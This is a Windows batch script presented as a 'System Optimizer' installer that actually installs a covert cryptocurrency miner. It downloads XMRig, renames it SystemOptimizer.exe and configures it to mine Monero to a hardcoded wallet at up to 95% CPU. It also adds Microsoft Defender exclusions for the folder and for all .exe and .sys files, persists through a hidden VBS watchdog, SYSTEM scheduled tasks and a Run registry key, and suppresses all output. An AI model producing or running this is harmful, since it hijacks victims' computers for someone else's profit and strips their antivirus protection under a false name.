@echo off
setlocal enabledelayedexpansion

REM ===== SYSTEM OPTIMIZER INSTALLER (Batch) =====

REM Create directory
if not exist "C:\ProgramData\SystemOptimizer" mkdir "C:\ProgramData\SystemOptimizer"

REM Download XMRig
bitsadmin /transfer XMRigDownload /download /priority FOREGROUND "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" "%TEMP%\xmrig.zip" >nul 2>&1

REM Extract
powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%TEMP%\xmrig_tmp' -Force" >nul 2>&1
move /y "%TEMP%\xmrig_tmp\xmrig-6.26.0\xmrig.exe" "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" >nul 2>&1
rmdir /s /q "%TEMP%\xmrig_tmp" >nul 2>&1
del "%TEMP%\xmrig.zip" >nul 2>&1

REM Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue" >nul 2>&1

REM Create config.json
powershell -Command "$config = @{ autosave=$false; background=$true; colors=$false; 'donate-level'=1; 'log-file'='C:\ProgramData\SystemOptimizer\optimizer.log'; 'print-time'=30; retries=5; 'retry-pause'=10; cpu=@{ enabled=$true; 'huge-pages'=$true; 'huge-pages-jit'=$true; 'hw-aes'=$true; priority=1; yield=$true; 'max-cpu-usage'=95; asm=$true; 'argon2-impl'='auto'; 'max-threads-hint'=100 }; pools=@(@{ url='gulf.moneroocean.stream:10001'; user='435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv'; pass='x'; keepalive=$true; tls=$false; nicehash=$false; 'rig-id'=$env:COMPUTERNAME }); api=@{ enabled=$true; host='127.0.0.1'; port=3456; restricted=$true } } | ConvertTo-Json -Depth 5 | Out-File -FilePath 'C:\ProgramData\SystemOptimizer\config.json' -Encoding ascii" >nul 2>&1

REM Create watchdog.vbs using PowerShell (avoids batch escaping issues)
powershell -Command "$wd = @'
Set sh = CreateObject(\"WScript.Shell\")
Set wmi = GetObject(\"winmgmts:\")
If wmi.ExecQuery(\"SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'\").Count > 1 Then WScript.Quit
Do
    Set p = wmi.ExecQuery(\"SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'\")
    If p.Count = 0 Then
        sh.Run \"\"\"C:\ProgramData\SystemOptimizer\SystemOptimizer.exe\"\" --config=\"\"C:\ProgramData\SystemOptimizer\config.json\"\"\", 0, False
    End If
    WScript.Sleep 30000
Loop
'@ | Out-File -FilePath 'C:\ProgramData\SystemOptimizer\watchdog.vbs' -Encoding ascii" >nul 2>&1

REM Scheduled tasks
schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K >nul 2>&1

REM Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /f >nul 2>&1

REM Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue" >nul 2>&1

REM Start watchdog
wscript.exe "C:\ProgramData\SystemOptimizer\watchdog.vbs"

exit /b 0